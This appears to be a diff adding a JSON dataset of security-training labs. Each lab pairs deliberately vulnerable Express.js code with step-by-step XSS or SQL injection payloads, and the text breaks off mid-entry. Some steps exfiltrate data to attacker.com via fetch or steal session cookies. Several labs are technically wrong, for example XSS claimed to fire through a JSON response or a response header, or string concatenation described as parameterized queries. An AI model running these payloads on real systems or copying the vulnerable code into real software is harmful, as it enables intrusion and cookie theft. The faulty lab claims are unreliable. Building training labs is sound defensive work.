@@ -1,0 +1,359 @@
+[
+    {
+      "Lab scenario": "Stored XSS in PDF Generator's Metadata",
+      "Lab Description": "The application allows users to upload documents and generates downloadable PDFs. However, the PDF metadata fields (e.g., title, author) are not sanitized. The application directly embeds user input into the PDF metadata.\nTo solve: Inject a JavaScript payload into the metadata field and trigger execution upon opening the document in a web viewer.",
+      "Difficulty Level": "Medium",
+      "Solution Steps": [
+        "Use Burp Suite's Repeater to submit a modified document upload request containing JavaScript payload in the metadata.",
+        "Inspect the generated PDF file to confirm payload retention.",
+        "Inject <script>alert(document.domain)</script> into the 'Author' field.",
+        "Download and open the PDF in a browser-based PDF viewer.",
+        "Observe the alert box confirming the XSS execution."
+      ],
+      "Vulnerability name": "Cross-site scripting",
+      "srcCode": "const express = require('express');\nconst multer = require('multer');\nconst fs = require('fs');\nconst pdfkit = require('pdfkit');\n\nconst app = express();\nconst upload = multer({ dest: 'uploads/' });\n\napp.post('/upload', upload.single('file'), (req, res) => {\n    const doc = new pdfkit();\n    const filePath = `uploads/${Date.now()}.pdf`;\n    doc.info.Title = req.body.title;\n    doc.info.Author = req.body.author;\n    doc.pipe(fs.createWriteStream(filePath));\n    doc.end();\n    res.send(`File saved: <a href='/${filePath}'>Download PDF</a>`);\n});\n\napp.listen(3000, () => console.log('Server running on port 3000'));"
+    },
+    {
+      "Lab scenario": "DOM-based XSS in WebSocket Chat Application",
+      "Lab Description": "A WebSocket-based chat application dynamically updates messages on the page using JavaScript innerHTML. User input is passed directly to the DOM without sanitization.\nTo solve: Inject a JavaScript payload into the chat input and trigger it upon rendering the received message.",
+      "Difficulty Level": "Hard",
+      "Solution Steps": [
+        "Use the browser console to establish a WebSocket connection.",
+        "Send a malicious message payload: <img src=x onerror=alert(document.cookie)>",
+        "Observe that the payload executes upon message rendering.",
+        "Craft an obfuscated variation such as <svg/onload=alert(1)>.",
+        "Confirm execution and exfiltration of user session cookies."
+      ],
+      "Vulnerability name": "Cross-site scripting",
+      "srcCode": "const WebSocket = require('ws');\nconst express = require('express');\nconst app = express();\nconst server = require('http').createServer(app);\nconst wss = new WebSocket.Server({ server });\n\napp.use(express.static('public'));\n\nwss.on('connection', ws => {\n    ws.on('message', message => {\n        wss.clients.forEach(client => {\n            if (client.readyState === WebSocket.OPEN) {\n                client.send(`<b>${message}</b>`);\n            }\n        });\n    });\n});\n\nserver.listen(3000, () => console.log('WebSocket server running on port 3000'));"
+    },
+    
+    {
+      "Lab scenario": "Reflected XSS via HTTP Header in Error Logging",
+      "Lab Description": "An API exposes an error page that reflects user-controlled data from the 'Referer' header without encoding. Attackers can inject JavaScript payloads via crafted HTTP requests.\nTo solve: Inject a payload into the 'Referer' header and trigger execution on the error page.",
+      "Difficulty Level": "Easy",
+      "Solution Steps": [
+        "Use Postman or Burp Suite to send a request with a modified 'Referer' header.",
+        "Inject payload: <script>alert(document.domain)</script>.",
+        "Observe the error page reflecting the payload.",
+        "Modify the payload to use event-based execution: <img src=x onerror=alert(1)>.",
+        "Confirm execution within the browser context."
+      ],
+      "Vulnerability name": "Cross-site scripting",
+      "srcCode": "const express = require('express');\nconst app = express();\n\napp.get('/error', (req, res) => {\n    const referer = req.headers['referer'] || 'Unknown';\n    res.send(`<h2>Error: Access denied from ${referer}</h2>`);\n});\n\napp.listen(3000, () => console.log('Server running on port 3000'));"
+    },
+    {
+      "Lab scenario": "Mutation-based XSS via Form Autofill",
+      "Lab Description": "The web application includes an autofill mechanism that modifies DOM elements dynamically based on user input. However, it fails to properly sanitize input before updating the DOM, allowing attackers to execute malicious scripts.\nTo solve: Exploit the mutation event handler to trigger XSS upon autofill activation.",
+      "Difficulty Level": "Hard",
+      "Solution Steps": [
+        "Inspect the form autofill mechanism in DevTools.",
+        "Manually inject an event-based payload: <input onfocus=alert(1) autofocus>.",
+        "Trigger the autofill process by navigating back to the form.",
+        "Modify the attack to use a stealth payload: <svg onload=fetch('http://attacker.com')>.",
+        "Confirm successful script execution and data exfiltration."
+      ],
+      "Vulnerability name": "Cross-site scripting",
+      "srcCode": "const express = require('express');\nconst app = express();\n\napp.get('/', (req, res) => {\n    res.send(`\n    <form>\n      <input type=\"text\" id=\"username\" placeholder=\"Enter username\">\n      <button type=\"submit\">Submit</button>\n    </form>\n    <script>\n      document.getElementById('username').oninput = function() {\n        document.getElementById('username').setAttribute('value', this.value);\n      };\n    </script>\n    `);\n});\n\napp.listen(3000, () => console.log('Server running on port 3000'));"
+    },
+    {
+        "Lab scenario": "Reflected XSS in JSONP Callback Parameter",
+        "Lab Description": "An API endpoint provides JSONP responses and accepts a user-supplied callback parameter without proper sanitization. This vulnerability allows an attacker to inject malicious JavaScript code that is executed in the context of the victim's browser when the response is loaded.\nTo solve: Craft a request with a malicious callback value that triggers script execution upon the JSONP response being processed by the browser.",
+        "Difficulty Level": "Easy",
+        "Solution Steps": [
+          "Send a GET request to the vulnerable endpoint using Postman or a web browser.",
+          "Set the callback parameter to a payload such as <script>alert('XSS')</script>.",
+          "Observe the JSONP response reflecting the unsanitized callback parameter.",
+          "Modify the payload to an obfuscated variant, e.g., <img src=x onerror=alert(1)> if necessary.",
+          "Confirm that the payload executes when the response is processed in the browser."
+        ],
+        "Vulnerability name": "Cross-site scripting",
+        "srcCode": "const express = require('express');\nconst app = express();\n\n// Vulnerable JSONP endpoint\napp.get('/data', (req, res) => {\n  const callback = req.query.callback || 'callback';\n  // Vulnerable: directly injecting the user-supplied callback into the response\n  const data = { message: 'Hello, World!' };\n  res.type('text/javascript');\n  res.send(`${callback}(${JSON.stringify(data)});`);\n});\n\napp.listen(3000, () => console.log('JSONP server running on port 3000'));\n"
+      },
+
+    {
+        "Lab scenario": "Stored XSS in Comment System with Emoji Rendering",
+        "Lab Description": "The application's comment system supports emoji rendering, but fails to properly sanitize user input before processing. Attackers can inject JavaScript payloads disguised as emoji text.\nTo solve: Inject a payload inside a comment and trigger execution upon rendering.",
+        "Difficulty Level": "Medium",
+        "Solution Steps": [
+          "Use Burp Suite to intercept a comment submission request.",
+          "Inject payload disguised as an emoji: 😊<script>alert(document.cookie)</script>.",
+          "Submit the comment and reload the page.",
+          "Observe the XSS execution when the comment is displayed.",
+          "Confirm session hijacking by stealing cookies."
+        ],
+        "Vulnerability name": "Cross-site scripting",
+        "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\n\nlet comments = [];\napp.use(bodyParser.urlencoded({ extended: true }));\napp.get('/', (req, res) => {\n    res.send(`<form action='/comment' method='POST'>\n      <input type='text' name='comment' placeholder='Enter comment'>\n      <button type='submit'>Post</button>\n    </form>\n    <div>${comments.join('<br>')}</div>`);\n});\napp.post('/comment', (req, res) => {\n    comments.push(req.body.comment);\n    res.redirect('/');\n});\napp.listen(3000, () => console.log('Server running on port 3000'));"
+      },
+      {
+        "Lab scenario": "Blind SQL Injection in Login Page",
+        "Lab Description": "The login page uses parameterized queries incorrectly, making it vulnerable to blind SQL injection attacks. Since no errors are displayed, attackers must infer success based on response time.\nTo solve: Exploit time-based SQL injection to confirm the vulnerability.",
+        "Difficulty Level": "Hard",
+        "Solution Steps": [
+          "Use Burp Suite Intruder to automate login attempts.",
+          "Inject time-based payload: ' OR IF(1=1, SLEEP(5), 0) --.",
+          "Observe response delay confirming successful injection.",
+          "Extract database version using payload: ' OR IF(database() LIKE 's%', SLEEP(5), 0) --.",
+          "Confirm database enumeration and successful exploitation."
+        ],
+        "Vulnerability name": "SQL Injection",
+        "srcCode": "const express = require('express');\nconst mysql = require('mysql');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\nconst db = mysql.createConnection({ host: 'localhost', user: 'root', password: '', database: 'users' });\ndb.connect();\napp.post('/login', (req, res) => {\n    const query = `SELECT * FROM users WHERE username='${req.body.username}' AND password='${req.body.password}'`;\n    db.query(query, (err, result) => {\n        res.send(result.length ? 'Login successful' : 'Invalid credentials');\n    });\n});\napp.listen(3000, () => console.log('Server running on port 3000'));"
+      },
+      {
+        "Lab scenario": "Reflected XSS in JSON API Response",
+        "Lab Description": "The API returns user-provided input directly in a JSON response without encoding. JavaScript code injected into the 'message' parameter executes when viewed in certain browsers.\nTo solve: Inject a JavaScript payload into the 'message' parameter and trigger execution.",
+        "Difficulty Level": "Easy",
+        "Solution Steps": [
+          "Use Postman to send a request to /api/message?text=<script>alert(1)</script>.",
+          "Observe the response reflecting the payload.",
+          "Access the API response via a vulnerable browser context (e.g., an embedded iframe).",
+          "Modify payload for obfuscation: \"><script>alert('XSS')</script>.",
+          "Confirm successful execution within the browser."
+        ],
+        "Vulnerability name": "Cross-site scripting",
+        "srcCode": "const express = require('express');\nconst app = express();\n\napp.get('/api/message', (req, res) => {\n    res.json({ message: req.query.text });\n});\n\napp.listen(3000, () => console.log('Server running on port 3000'));"
+      },
+      {
+        "Lab scenario": "Stored XSS in GraphQL Query Response",
+        "Lab Description": "A GraphQL API endpoint echoes user-controlled input in responses without sanitization. Attackers can inject malicious JavaScript that executes when another user queries the API.\nTo solve: Inject an XSS payload in a stored query field and retrieve it through another API call.",
+        "Difficulty Level": "Medium",
+        "Solution Steps": [
+          "Use GraphQL Playground to send a mutation request storing JavaScript in a query field.",
+          "Inject: mutation { saveComment(text: \"<script>alert(1)</script>\") }.",
+          "Send a GraphQL query to retrieve the stored comment.",
+          "Observe XSS execution when the response is rendered in a web interface.",
+          "Modify payload for stealth execution: <svg/onload=alert(1)>."
+        ],
+        "Vulnerability name": "Cross-site scripting",
+        "srcCode": "const express = require('express');\nconst { graphqlHTTP } = require('express-graphql');\nconst { buildSchema } = require('graphql');\n\nconst schema = buildSchema(`\n  type Query { comments: [String] }\n  type Mutation { saveComment(text: String!): String }\n`);\n\nlet comments = [];\nconst root = {\n    comments: () => comments,\n    saveComment: ({ text }) => {\n        comments.push(text);\n        return 'Comment saved';\n    }\n};\n\nconst app = express();\napp.use('/graphql', graphqlHTTP({ schema, rootValue: root, graphiql: true }));\napp.listen(3000, () => console.log('GraphQL server running on port 3000'));"
+      },
+    {
+        "Lab scenario": "Mutation-based XSS in Event Listener",
+        "Lab Description": "The application listens for user input events and updates the DOM dynamically. Malicious input can modify the event handler to execute arbitrary JavaScript.\nTo solve: Inject an XSS payload using an unexpected mutation event and trigger execution.",
+        "Difficulty Level": "Hard",
+        "Solution Steps": [
+            "Inspect the page's JavaScript event listeners using DevTools.",
+            "Identify an input field that triggers a mutation event.",
+            "Inject payload into an input field: <input onfocus=alert(1) autofocus>.",
+            "Navigate back to the input field to trigger the event.",
+            "Observe XSS execution within the browser context."
+        ],
+        "Vulnerability name": "Cross-site scripting",
+        "srcCode": "const express = require('express');\nconst app = express();\napp.get('/', (req, res) => {\n    res.send(`\n    <form>\n      <input type='text' id='user_input' placeholder='Type something'>\n      <button type='submit'>Submit</button>\n    </form>\n    <script>\n      document.getElementById('user_input').addEventListener('input', function() {\n        document.getElementById('user_input').setAttribute('value', this.value);\n      });\n    </script>\n    `);\n});\napp.listen(3000, () => console.log('Server running on port 3000'));"
+    },
+
+
+    {
+        "Lab scenario": "Stored XSS in WebSocket Chat Application",
+        "Lab Description": "A WebSocket-based chat application broadcasts user messages without proper sanitization, allowing stored XSS. The application directly inserts unsanitized messages into the DOM of connected clients.\nTo solve: Inject a JavaScript payload into a chat message and trigger execution on another client.",
+        "Difficulty Level": "Medium",
+        "Solution Steps": [
+        "Intercept a WebSocket message using Burp Suite to observe its structure.",
+        "Inject a payload such as <script>alert('XSS')</script> into the chat message.",
+        "Send the modified message through the WebSocket connection.",
+        "Observe the payload execution on another connected client.",
+        "Refine the payload using obfuscation (e.g., <img src=x onerror=alert(1)>) to bypass simple filters."
+        ],
+        "Vulnerability name": "Cross-site scripting",
+        "srcCode": "const express = require('express');\nconst http = require('http');\nconst WebSocket = require('ws');\nconst app = express();\nconst server = http.createServer(app);\nconst wss = new WebSocket.Server({ server });\n\nwss.on('connection', ws => {\n    ws.on('message', message => {\n        // Vulnerable: directly broadcasting unsanitized message\n        wss.clients.forEach(client => {\n            if (client.readyState === WebSocket.OPEN) {\n                client.send(message);\n            }\n        });\n    });\n});\n\nserver.listen(3000, () => console.log('WebSocket server running on port 3000'));"
+    },
+    {
+        "Lab scenario": "DOM-based XSS via window.name Property",
+        "Lab Description": "This lab demonstrates a DOM-based XSS vulnerability where the application reads the window.name property and injects its value into the HTML without sanitization.\nTo solve: Modify window.name with a JavaScript payload and trigger its execution on page load.",
+        "Difficulty Level": "Medium",
+        "Solution Steps": [
+        "Open a new browser tab and set window.name to a payload, e.g., '<script>alert(\"XSS\")</script>'.",
+        "Navigate to the vulnerable page that reads window.name.",
+        "Observe the unsanitized insertion of window.name into the DOM.",
+        "Test an obfuscated payload such as '<img src=x onerror=alert(1)>' to bypass filters.",
+        "Confirm the payload execution upon page load."
+        ],
+        "Vulnerability name": "Cross-site scripting",
+        "srcCode": "const express = require('express');\nconst app = express();\n\napp.get('/', (req, res) => {\n  res.send(`\n    <html>\n      <body>\n        <script>\n          // Vulnerable: directly injecting window.name into the page\n          if(window.name) {\n            document.body.innerHTML += window.name;\n          }\n        </script>\n      </body>\n    </html>\n  `);\n});\n\napp.listen(3000, () => console.log('Server running on port 3000'));\n"
+    },
+    {
+        "Lab scenario": "Mutation-Based XSS in Content Editable Element",
+        "Lab Description": "The application provides a contenteditable div for user input without proper sanitization, allowing an attacker to inject malicious scripts. The vulnerability lies in the dynamic mutation of the DOM based on user input.\nTo solve: Inject a JavaScript payload into the contenteditable area and trigger its execution upon re-rendering.",
+        "Difficulty Level": "Hard",
+        "Solution Steps": [
+        "Locate the contenteditable div using browser DevTools.",
+        "Inject a payload such as <div contenteditable='true'><script>alert('XSS')</script></div>.",
+        "Submit the form to save the content.",
+        "Reload the page to see the unsanitized content being rendered.",
+        "Refine the payload to bypass potential filters, e.g., using an SVG onload event."
+        ],
+        "Vulnerability name": "Cross-site scripting",
+        "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\n\nlet storedContent = '';\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.get('/', (req, res) => {\n  res.send(`\n    <html>\n      <body>\n        <form action='/save' method='POST'>\n          <div contenteditable='true' id='editable' name='content'>${storedContent}</div>\n          <button type='submit'>Save</button>\n        </form>\n        <script>\n          // Vulnerable: client-side code that saves unsanitized input\n          document.getElementById('editable').addEventListener('input', function() {\n            this.setAttribute('value', this.innerHTML);\n          });\n        </script>\n      </body>\n    </html>\n  `);\n});\n\napp.post('/save', (req, res) => {\n  storedContent = req.body.content;\n  res.redirect('/');\n});\n\napp.listen(3000, () => console.log('Server running on port 3000'));\n"
+    },
+    {
+        "Lab scenario": "Reflected XSS in HTTP Response Header",
+        "Lab Description": "This lab targets a vulnerability where the application reflects data from a custom HTTP header into the response header without sanitization. Attackers can inject malicious scripts that execute in the browser.\nTo solve: Inject an XSS payload in a custom header and observe its execution when the response header is processed.",
+        "Difficulty Level": "Easy",
+        "Solution Steps": [
+        "Intercept an HTTP request using Burp Suite or Postman.",
+        "Modify a custom header (e.g., X-Custom) to include the payload: <script>alert('XSS')</script>.",
+        "Send the request and review the HTTP response headers.",
+        "Craft a payload variant (e.g., <img src=x onerror=alert(1)>) to bypass basic filters.",
+        "Confirm that the injected script executes in the browser context."
+        ],
+        "Vulnerability name": "Cross-site scripting",
+        "srcCode": "const express = require('express');\nconst app = express();\n\napp.get('/', (req, res) => {\n  // Vulnerable: reflecting the custom header into the response header\n  const injectedHeader = req.headers['x-custom'] || 'No header provided';\n  res.setHeader('X-Injected', injectedHeader);\n  res.send('Check your browser console or header inspector.');\n});\n\napp.listen(3000, () => console.log('Server running on port 3000'));\n"
+    },
+    {
+        "Lab scenario": "Stored XSS in GraphQL Comment Field",
+        "Lab Description": "A GraphQL API endpoint accepts and stores user comments without proper sanitization. When these comments are later rendered on a web page, the unsanitized content triggers an XSS attack.\nTo solve: Inject a JavaScript payload via a GraphQL mutation and trigger its execution during comment retrieval.",
+        "Difficulty Level": "Medium",
+        "Solution Steps": [
+        "Access the GraphQL Playground to interact with the API.",
+        "Send a mutation to add a comment: mutation { addComment(comment: \"<script>alert('XSS')</script>\") }.",
+        "Execute a query to retrieve stored comments.",
+        "Observe that the unsanitized comment executes in the client browser.",
+        "Refine the payload to bypass filters, for example, using an SVG onload event."
+        ],
+        "Vulnerability name": "Cross-site scripting",
+        "srcCode": "const express = require('express');\nconst { graphqlHTTP } = require('express-graphql');\nconst { buildSchema } = require('graphql');\n\nconst schema = buildSchema(`\n  type Query { comments: [String] }\n  type Mutation { addComment(comment: String!): String }\n`);\n\nlet comments = [];\n\nconst root = {\n  comments: () => comments,\n  addComment: ({ comment }) => {\n    // Vulnerable: storing unsanitized comment\n    comments.push(comment);\n    return 'Comment saved';\n  }\n};\n\nconst app = express();\napp.use('/graphql', graphqlHTTP({\n  schema: schema,\n  rootValue: root,\n  graphiql: true\n}));\n\napp.listen(3000, () => console.log('GraphQL API running on port 3000'));\n"
+    },
+
+    {
+        "Lab scenario": "Stored XSS in Notification Panel",
+        "Lab Description": "The application maintains a notification panel where server-stored messages are rendered on the client without proper sanitization. Attackers can inject JavaScript payloads into notification messages that persist and execute when viewed.\nTo solve: Inject a payload into the notification submission and trigger its execution when the panel reloads.",
+        "Difficulty Level": "Medium",
+        "Solution Steps": [
+        "Intercept a notification submission using Burp Suite and modify the payload.",
+        "Inject a script payload such as <script>alert('XSS')</script> into the notification message.",
+        "Submit the modified notification to store it on the server.",
+        "Refresh the notification panel and observe the payload execution.",
+        "Refine the payload using an obfuscated variant (e.g., <img src=x onerror=alert(1)>) to bypass filters."
+        ],
+        "Vulnerability name": "Cross-site scripting",
+        "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\n\nlet notifications = [];\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.get('/', (req, res) => {\n  let notifHTML = notifications.map(n => `<div>${n}</div>`).join('');\n  res.send(`\n    <html>\n      <body>\n        <h2>Notifications</h2>\n        ${notifHTML}\n        <form action='/notify' method='POST'>\n          <input type='text' name='message' placeholder='Enter notification'>\n          <button type='submit'>Send</button>\n        </form>\n      </body>\n    </html>\n  `);\n});\n\napp.post('/notify', (req, res) => {\n  // Vulnerable: unsanitized input is stored and rendered\n  notifications.push(req.body.message);\n  res.redirect('/');\n});\n\napp.listen(3000, () => console.log('Server running on port 3000'));\n"
+    },
+    {
+        "Lab scenario": "DOM-based XSS in GraphQL Subscription Display",
+        "Lab Description": "This lab involves a GraphQL subscription that delivers real-time updates to a client-side dashboard. The subscription data is inserted into the DOM without proper encoding, allowing an attacker to deliver a malicious payload via the subscription stream.\nTo solve: Inject a payload through the subscription endpoint and trigger it when the client renders the data.",
+        "Difficulty Level": "Hard",
+        "Solution Steps": [
+        "Connect to the GraphQL subscription endpoint via GraphQL Playground or a custom client.",
+        "Send a subscription message containing a payload like <script>alert('XSS')</script>.",
+        "Observe the client-side dashboard receiving and inserting the payload into the DOM.",
+        "Alter the payload to bypass basic filters (e.g., using <svg/onload=alert(1)>).",
+        "Confirm the script execution upon message rendering in the client."
+        ],
+        "Vulnerability name": "Cross-site scripting",
+        "srcCode": "const express = require('express');\nconst { graphqlHTTP } = require('express-graphql');\nconst { buildSchema } = require('graphql');\nconst http = require('http');\nconst WebSocket = require('ws');\n\n// Simple GraphQL schema with subscription simulation\nconst schema = buildSchema(`\n  type Query { info: String }\n  type Mutation { sendUpdate(message: String!): String }\n`);\n\nlet currentMessage = '';\nconst root = {\n  info: () => currentMessage,\n  sendUpdate: ({ message }) => {\n    // Vulnerable: storing unsanitized subscription message\n    currentMessage = message;\n    return 'Update sent';\n  }\n};\n\nconst app = express();\napp.use('/graphql', graphqlHTTP({\n  schema,\n  rootValue: root,\n  graphiql: true\n}));\n\nconst server = http.createServer(app);\nconst wss = new WebSocket.Server({ server });\n\n// Simulate pushing subscription updates to all clients\nsetInterval(() => {\n  wss.clients.forEach(client => {\n    if (client.readyState === WebSocket.OPEN) {\n      client.send(currentMessage);\n    }\n  });\n}, 5000);\n\nserver.listen(3000, () => console.log('GraphQL subscription server running on port 3000'));\n"
+    },
+    {
+        "Lab scenario": "Reflected XSS in URL Fragment Parsing",
+        "Lab Description": "The client-side script extracts the URL fragment (window.location.hash) and injects it into the DOM without proper sanitization. An attacker can craft a URL with a malicious hash that executes arbitrary JavaScript when the page loads.\nTo solve: Modify the URL fragment to include a payload and trigger its execution in the browser.",
+        "Difficulty Level": "Easy",
+        "Solution Steps": [
+        "Open the vulnerable page in a browser.",
+        "Append a malicious payload to the URL hash, e.g., #<script>alert('XSS')</script>.",
+        "Reload the page to let the client-side script process the hash.",
+        "Observe that the unsanitized hash is inserted into the DOM and executes.",
+        "Test with an obfuscated payload (e.g., using <img src=x onerror=alert(1)>) to bypass simple filters."
+        ],
+        "Vulnerability name": "Cross-site scripting",
+        "srcCode": "const express = require('express');\nconst app = express();\n\napp.get('/', (req, res) => {\n  res.send(`\n    <html>\n      <body>\n        <h2>Welcome</h2>\n        <div id='content'></div>\n        <script>\n          // Vulnerable: directly using window.location.hash without sanitization\n          var hash = window.location.hash.substring(1);\n          if(hash) {\n            document.getElementById('content').innerHTML = hash;\n          }\n        </script>\n      </body>\n    </html>\n  `);\n});\n\napp.listen(3000, () => console.log('Server running on port 3000'));\n"
+    },
+    {
+        "Lab scenario": "Stored XSS in User Profile Update Section",
+        "Lab Description": "Users can update their profile information, including a bio, which is stored on the server and rendered on their profile page. Lack of sanitization allows malicious scripts to persist and execute in the profile view.\nTo solve: Inject a JavaScript payload in the bio update and verify execution when the profile is loaded.",
+        "Difficulty Level": "Medium",
+        "Solution Steps": [
+        "Submit a profile update using Postman or the web interface with a payload like <script>alert('XSS')</script> in the bio field.",
+        "Ensure the updated bio is stored on the server.",
+        "Navigate to the profile page to view the stored bio.",
+        "Observe that the payload executes in the user’s browser.",
+        "Refine the payload (e.g., <svg/onload=alert(1)>) to bypass simple input filters."
+        ],
+        "Vulnerability name": "Cross-site scripting",
+        "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\n\nlet userProfile = { bio: 'Default bio' };\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.get('/profile', (req, res) => {\n  // Vulnerable: unsanitized user bio is rendered\n  res.send(`\n    <html>\n      <body>\n        <h2>User Profile</h2>\n        <div>${userProfile.bio}</div>\n        <form action='/update' method='POST'>\n          <input type='text' name='bio' placeholder='Update bio'>\n          <button type='submit'>Update</button>\n        </form>\n      </body>\n    </html>\n  `);\n});\n\napp.post('/update', (req, res) => {\n  userProfile.bio = req.body.bio;\n  res.redirect('/profile');\n});\n\napp.listen(3000, () => console.log('Server running on port 3000'));\n"
+    },
+    {
+        "Lab scenario": "Mutation-based XSS via Drag-and-Drop File Upload",
+        "Lab Description": "The application supports drag-and-drop file uploads and displays file metadata in a preview panel. The preview code unsafely uses innerHTML to render metadata, allowing mutation-based XSS when an attacker uploads a file with a maliciously crafted metadata field.\nTo solve: Modify the file metadata to include a payload and trigger its execution when the preview is rendered.",
+        "Difficulty Level": "Hard",
+        "Solution Steps": [
+        "Simulate a file upload by sending a request with JSON file metadata using Postman or Burp Suite.",
+        "Inject a payload such as <script>alert('XSS')</script> in the metadata field (e.g., file description).",
+        "Upload the file and observe the preview panel rendering the metadata.",
+        "Notice the unsanitized insertion of the payload causing script execution.",
+        "Test a refined payload (e.g., <img src=x onerror=alert(1)>) to bypass basic sanitization."
+        ],
+        "Vulnerability name": "Cross-site scripting",
+        "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.json());\n\nlet filePreviews = [];\n\n// Endpoint to handle simulated file uploads with metadata\napp.post('/upload', (req, res) => {\n  // Vulnerable: storing unsanitized file metadata\n  filePreviews.push(req.body.metadata);\n  res.send('File uploaded');\n});\n\napp.get('/preview', (req, res) => {\n  let previewHTML = filePreviews.map(meta => `<div>${meta}</div>`).join('');\n  res.send(`\n    <html>\n      <body>\n        <h2>File Previews</h2>\n        ${previewHTML}\n      </body>\n    </html>\n  `);\n});\n\napp.listen(3000, () => console.log('Server running on port 3000'));\n"
+    },
+
+        {
+          "Lab scenario": "DOM-based XSS via Local Storage Injection",
+          "Lab Description": "The application saves user preferences in the browser's localStorage and later reads them to personalize the UI. However, it fails to sanitize the stored values before inserting them into the DOM, allowing attackers to inject malicious scripts.\nTo solve: Inject a JavaScript payload into localStorage using browser DevTools and trigger its execution when the page loads.",
+          "Difficulty Level": "Medium",
+          "Solution Steps": [
+            "Open the browser console and set a malicious value in localStorage, e.g., localStorage.setItem('prefs', '<script>alert(1)</script>').",
+            "Reload the page to trigger the unsanitized insertion of the localStorage value into the DOM.",
+            "Observe the execution of the injected payload.",
+            "Test a bypass variant using an obfuscated payload, e.g., '<img src=x onerror=alert(1)>' stored instead.",
+            "Confirm the successful script execution upon page reload."
+          ],
+          "Vulnerability name": "Cross-site scripting",
+          "srcCode": "const express = require('express');\nconst app = express();\n\napp.get('/', (req, res) => {\n  res.send(`\n    <html>\n      <head>\n        <title>Preference Loader</title>\n      </head>\n      <body>\n        <h2>Welcome Back!</h2>\n        <div id='userPrefs'></div>\n        <script>\n          // Vulnerable: directly using localStorage content without sanitization\n          var prefs = localStorage.getItem('prefs');\n          if(prefs) {\n            document.getElementById('userPrefs').innerHTML = prefs;\n          }\n        </script>\n      </body>\n    </html>\n  `);\n});\n\napp.listen(3000, () => console.log('Server running on port 3000'));\n"
+        },
+        {
+          "Lab scenario": "Reflected XSS in REST API Error Message",
+          "Lab Description": "An API endpoint designed to handle user requests returns error messages containing the unsanitized user input. An attacker can supply a malicious value that gets reflected in the error message, leading to XSS when the error is displayed in the browser.\nTo solve: Craft a request with a payload in the input parameter and trigger the reflected error message.",
+          "Difficulty Level": "Easy",
+          "Solution Steps": [
+            "Use Postman or Burp Suite to send a request with an invalid parameter value including a payload, e.g., <script>alert('XSS')</script>.",
+            "Observe the error message reflecting the payload in the API response.",
+            "Modify the payload to bypass simple filters, e.g., using <img src=x onerror=alert(1)>.",
+            "Reload the request and inspect the response in a vulnerable browser context.",
+            "Confirm execution of the injected script from the error message."
+          ],
+          "Vulnerability name": "Cross-site scripting",
+          "srcCode": "const express = require('express');\nconst app = express();\n\napp.get('/api/data', (req, res) => {\n  const userInput = req.query.input || '';\n  // Vulnerable: reflecting user input in error message without sanitization\n  if (!userInput.match(/^[a-zA-Z0-9]+$/)) {\n    return res.status(400).send(`Error: Invalid input: ${userInput}`);\n  }\n  res.send('Valid input received');\n});\n\napp.listen(3000, () => console.log('Server running on port 3000'));\n"
+        },
+        {
+          "Lab scenario": "Stored XSS in Online Forum Post",
+          "Lab Description": "The forum application allows users to post messages that are stored on the server and later rendered on forum threads. The posts are not sanitized before display, letting attackers inject malicious scripts that persist across sessions.\nTo solve: Submit a forum post containing a payload and verify that it executes when the thread is viewed.",
+          "Difficulty Level": "Medium",
+          "Solution Steps": [
+            "Submit a new forum post using a payload like <script>alert('XSS')</script> via the web interface or Postman.",
+            "Ensure that the post is stored in the forum database.",
+            "Reload the forum thread and observe the execution of the payload.",
+            "Attempt a variant payload using <svg/onload=alert(1)> to bypass filters.",
+            "Confirm that the stored post triggers script execution on every page load."
+          ],
+          "Vulnerability name": "Cross-site scripting",
+          "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\n\nlet forumPosts = [];\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.get('/forum', (req, res) => {\n  let postsHTML = forumPosts.map(post => `<p>${post}</p>`).join('');\n  res.send(`\n    <html>\n      <body>\n        <h2>Forum Posts</h2>\n        ${postsHTML}\n        <form action='/post' method='POST'>\n          <input type='text' name='post' placeholder='Your post'>\n          <button type='submit'>Submit</button>\n        </form>\n      </body>\n    </html>\n  `);\n});\n\napp.post('/post', (req, res) => {\n  // Vulnerable: unsanitized forum post is stored and rendered\n  forumPosts.push(req.body.post);\n  res.redirect('/forum');\n});\n\napp.listen(3000, () => console.log('Server running on port 3000'));\n"
+        },
+        {
+          "Lab scenario": "DOM-based XSS via document.write in Widget Loader",
+          "Lab Description": "A widget loader dynamically generates content using document.write based on a URL parameter. The parameter is not sanitized, allowing an attacker to supply a malicious payload that executes when the widget is loaded.\nTo solve: Modify the URL parameter to include a script payload and trigger its execution in the widget's output.",
+          "Difficulty Level": "Hard",
+          "Solution Steps": [
+            "Access the widget loader page with a URL parameter, e.g., ?widget=<script>alert('XSS')</script>.",
+            "Observe that the payload is injected via document.write and executed on page load.",
+            "Test an alternative payload using an obfuscated version like <img src=x onerror=alert(1)> to bypass filters.",
+            "Examine the source code to identify the vulnerable document.write call.",
+            "Confirm that the payload executes in the browser context each time the widget is loaded."
+          ],
+          "Vulnerability name": "Cross-site scripting",
+          "srcCode": "const express = require('express');\nconst app = express();\n\napp.get('/widget', (req, res) => {\n  const widgetParam = req.query.widget || 'Default Widget';\n  // Vulnerable: using document.write with unsanitized input\n  res.send(`\n    <html>\n      <body>\n        <h2>Widget Loader</h2>\n        <script>\n          document.write(unescape('${encodeURIComponent(widgetParam)}'));\n        </script>\n      </body>\n    </html>\n  `);\n});\n\napp.listen(3000, () => console.log('Server running on port 3000'));\n"
+        },
+        {
+          "Lab scenario": "Mutation-based XSS in Dynamic Theme Editor",
+          "Lab Description": "The application provides a dynamic theme editor that allows users to customize the website's appearance by updating CSS stored on the server. The editor applies the submitted CSS directly into a style tag without sanitization, permitting XSS via malicious CSS payloads.\nTo solve: Inject a CSS-based payload using mutation events that triggers JavaScript execution when the theme is applied.",
+          "Difficulty Level": "Hard",
+          "Solution Steps": [
